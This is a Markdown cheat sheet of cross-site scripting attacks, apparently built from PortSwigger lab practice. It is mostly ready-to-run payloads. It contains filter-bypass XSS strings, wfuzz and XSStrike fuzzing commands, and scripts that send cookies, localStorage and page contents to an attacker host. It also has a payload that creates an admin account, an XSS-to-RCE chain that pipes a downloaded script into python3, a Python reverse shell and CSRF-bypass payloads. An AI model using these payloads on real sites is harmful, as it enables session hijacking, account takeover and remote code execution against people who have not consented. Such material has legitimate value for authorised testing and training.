# **XSS**

#### **Command to start serving the files**
```
python3 -m http.server 80
```

### Basic Payloads
```
<script>alert('XSS')</script>
"><script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>

<img src=1 onerror=alert(1)>
<><img src=1 onerror=alert(1)>
<img src=x onerror=alert('XSS');>

<svgonload=alert(1)>
"><svg onload=alert(1)>

javascript:alert(document.cookie)

hacked" onmouseover='alert(1)'

' - alert(1) - '

<iframe src="https://0ae100cb03a80c9080b70dbd0066002b.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```


### XSS Fuzzing
GET:
```
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "http://example.com/index.php?id=FUZZ"
```

POST:
```
wfuzz -c \
  -z file,/usr/share/seclists/Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt \
  --hh 0 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "session=wFUS8t2EVdxhNhDecZZfOYIqA3Jdq81K" \
  -d "csrf=nLFfUhKnGr82waCONvvO6Wxh4B5ZfjJx&postId=5&comment=FUZZ&name=Amrit&email=a%40b.com&website=https%3A%2F%2Fwww.google.com" \
  "https://0acc003003a53e0c80b208660013005f.web-security-academy.net/post/comment"
```

### Stealing Cookie
Note: If httponly flag is set, then cookie cannot be stolen using XSS.

- Payload       
```
<script src="http://<KaliIP>:80/xss.js"></script>
```      

```
<img src="x" onerror="var s=document.createElement('script'); s.src='http://<KaliIP>:80/xss.js'; document.head.appendChild(s);">

```

- Content of xss.js
```
fetch("http://<KaliIP>:80/exfil?data="+encodeURIComponent(document.cookie))
```

```
document.write('<img src="http://<KaliIP>:80/?exfil='+document.cookie+'" />');
```

```
window.location.href="http://<KaliIP>:80/?exfil=" + btoa(window.document.body.innerHTML);
```

```
fetch("http://<KaliIP>:80/exfil?data="+encodeURIComponent(JSON.stringify(localStorage)))
```

### Using XSS add a new admin
```
var xhttp = new XMLHttpRequest();
var creds = 'email=attacker@gmail.com&password=test&name=Attacker&username=attacker';
xhttp.open("GET", "/admin/users/add?" + creds, true);
xhttp.send();
```

### XSS to RCE
- Start netcat on port 443 to take reverse shell.
```
nc -nlvp 443
```

- Payload       
```
<script src="http://<KaliIP>:80/xss_to_rce.js"></script>
```   

- Create a XSS payload (xss_to_rce.js) that will trigger RCE.
First try to run a simple curl command to see if command injection is possible

```
fetch('http://localhost:3000/run_command', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: "cmd=curl http://<KaliIP>:443"
})
```

```
fetch('http://localhost:3000/run_command', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: "cmd=curl http://<KaliIP>:80/rce.py|python3"
})
```

- Create a Python reverse shell call rce.py and host it on port 80 in our Kali machine.
```
import os,pty,socket;s=socket.socket();s.connect(("<KaliIP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")
```

### Blind XSS endpoint
- Contact forms
- Ticket support
- Referer Header
    - Custom Site Analytics
    - Administrative Panel logs
- User Agent
    - Custom Site Analytics
    - Administrative Panel logs
- Comment Box
    - Administrative Panel

### Automated tools 

- **XSStrike**
```
cd /home/amrityam/kali/offsec/tools/XSStrike
sudo apt update
sudo apt install -y python3-venv


python3 -m venv .venv
source .venv/bin/activate

python -m pip install --upgrade pip setuptools wheel

pip install -r requirements.txt
```

#### GET Requests
- Basic GET parameter test
```
python3 xsstrike.py -u "http://example.com/search.php?q=test"
```
- GET with multiple parameters
```
python3 xsstrike.py -u "http://example.com/page.php?cat=1&id=10"
```
- GET with cookies (authenticated testing)
```
python3 xsstrike.py -u "http://example.com/search.php?q=test" --cookie "PHPSESSID=abc123; role=user"
```
- GET with custom headers
```
python3 xsstrike.py -u "http://example.com/search.php?q=test" --headers "User-Agent: Mozilla/5.0; X-Test: xsstrike"
```
- GET with crawling enabled
```
python3 xsstrike.py -u "http://example.com" --crawl
```

#### POST Requests
- Basic POST request
```
python3 xsstrike.py -u "http://example.com/login.php" --data "username=test&password=test"
```
- JSON POST request
```
python3 xsstrike.py -u "http://example.com/api/search" \
--data '{"query":"test"}' \
--json
```
- POST with cookies
```
python3 xsstrike.py -u "http://example.com/profile/update" \
--data "bio=test" \
--cookie "auth_token=xyz123"
```
- POST with custom headers
```
python3 xsstrike.py -u "http://example.com/submit.php" \
--data "comment=test" \
--headers "Content-Type: application/x-www-form-urlencoded"
```

### Useful Options
- Skip DOM-based tests (faster)
```
--skip-dom
```
- Blind XSS payload injection
```
--blind http://your-blind-xss-host
```
- Increase test depth
```
-l 5
```


### Portswigger Practitioner
```
document.write sink using source location.search inside a select element:
productId=1&storeId=</option></select><script>alert('XSS')</script>

AngularJS expression:
{{$on.constructor('alert(1)')()}}

Reflected DOM XSS:
\"-alert(1)}//

Stored DOM XSS in Blog Post - JavaScript replace():
<><img src=1 onerror=alert(1)>

Reflected XSS that bypasses the WAF and calls the print() function:
<iframe src="https://0a92004d038bfd0a808fa47300a00085.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

Reflected XSS into HTML context with all tags blocked except custom ones:
<script>
location = 'https://0a6300d104a2a205823639e3009e002b.web-security-academy.net//?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

Reflected XSS with some SVG markup allowed:
https://0ae0007e03162c8b85361ee200bc00de.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

Reflected XSS in canonical link tag
https://0a7b00d704ecf89480f0852100a90095.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

Reflected XSS into a JavaScript string with single quote and backslash escaped:
</script><script>alert(1)</script>

Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped:
\'-alert(1)//
```

-  Exploiting cross-site scripting to steal cookies
```
<script>
window.addEventListener('DOMContentLoaded', function(){
	var token = document.getElementsByName('csrf')[0].value;
	var data = new FormData();

	data.append('csrf', token);
	data.append('postId', 8);
	data.append('comment', document.cookie);
	data.append('name', 'victim');
	data.append('email', 'z3nsh3ll@gmail.com');
	data.append('website', 'http://www.zenshell.ninja');

	fetch('/post/comment', {
	    method: 'POST',
	    mode: 'no-cors',
	    body: data
	});

});
</script>
```

- Exploiting XSS to bypass CSRF defenses
```
<script>
window.addEventListener('DOMContentLoaded', function(){
    var token = document.getElementsByName('csrf')[0].value;

    var data = new FormData();
    data.append('csrf', token);
    data.append('email', 'evil@hacker.net');

    fetch('/my-account/change-email', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
});
</script>
```